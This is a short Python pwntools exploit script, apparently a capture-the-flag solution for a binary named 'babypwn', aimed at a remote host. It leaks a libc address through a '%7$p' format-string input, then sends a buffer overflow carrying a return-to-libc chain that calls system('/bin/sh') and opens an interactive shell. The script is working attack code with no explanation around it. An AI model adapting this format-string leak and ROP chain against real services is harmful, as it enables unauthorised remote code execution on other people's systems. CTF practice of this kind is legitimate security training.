from pwn import *

libc = ELF('./libc.so.6')
#io = remote('localhost', 5000)
#io = process('./babypwn_patched')
#gdb.attach(io)
#pause()
io = remote('be.ax', 31801)
io.sendline(b'%7$p')
io.recvuntil(b'Hi, ')
libc.address = int(io.recvline(), 16)-0xbc0+0x2000
log.info(hex(libc.address))
pl = b'a'*96+p64(libc.address+0x22679)+p64(libc.address+0x23b6a)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym['system'])
io.sendline(pl)
io.interactive()
